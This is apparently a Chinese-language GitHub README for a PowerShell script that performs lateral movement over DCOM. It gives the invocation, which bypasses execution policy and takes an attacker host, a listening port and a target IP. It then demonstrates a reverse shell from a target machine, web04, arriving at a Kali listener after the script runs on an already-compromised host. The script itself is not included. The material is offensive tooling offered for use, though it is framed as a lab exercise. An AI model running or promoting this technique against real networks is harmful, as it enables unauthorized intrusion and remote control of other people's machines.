# Dcom-LateralMovement
利用DCOM进行横向移动的脚本

使用方法：

powershell -ep bypass -c ".\dcom.ps1 lhost lport rhost"

例：

powershell -ep bypass -c ".\dcom.ps1 192.168.45.195 3333 192.168.195.72"


lhost：攻击机IP

lport：攻击机的监听端口

rhost：要横向移动到的目标靶机的IP

演示案例：

我们已经获得192.168.50.74 - client74的控制权限

想要横向移动到192.168.50.72 - web04主机

1. 在kali开启监听
![image](https://github.com/SiennaSkies/Dcom-LateralMovement/assets/105592340/0e7de4a5-9432-4bd6-b367-19907aa35850)
2. 在client74中运行脚本，kali收到来自web04的shell
![image](https://github.com/SiennaSkies/Dcom-LateralMovement/assets/105592340/a20e96ed-d847-42dc-8519-93740c11e556)

